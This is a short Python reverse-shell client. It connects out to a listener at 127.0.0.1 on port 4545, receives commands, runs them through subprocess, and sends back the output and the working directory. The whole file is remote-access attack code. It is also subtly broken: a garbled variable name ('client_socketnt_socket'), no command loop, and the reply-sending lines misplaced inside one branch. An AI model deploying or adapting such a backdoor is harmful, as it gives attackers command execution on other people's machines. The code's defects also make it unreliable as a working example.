import socket
import subprocess
import os


HOST="127.0.0.1"
PORT = 4545
BUFFER = 1024
SEP = "<sep>"


def shell():
	command=client_socketnt_socket.recv(BUFFER).decode()
	splited_command = command.split()

	if splited_command[0].lower() == "cd":
		try:
			os.chdir(" ".join(splited_command[1:]))
		except FileNotFoundError as e:
			output = str(e)
		else:
			output = ""
	else:
		output= subprocess.getoutput(command)
		cwd = os.getcwd()
		message = f"{output}{SEP}{cwd}"
		client_socket.send(message.encode())


def main():
	global client_socket
	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.connect((HOST, PORT))
	
	cwd = os.getcwd()
	client_socket.send(cwd.encode())
	shell()


if __name__ == '__main__':
	main()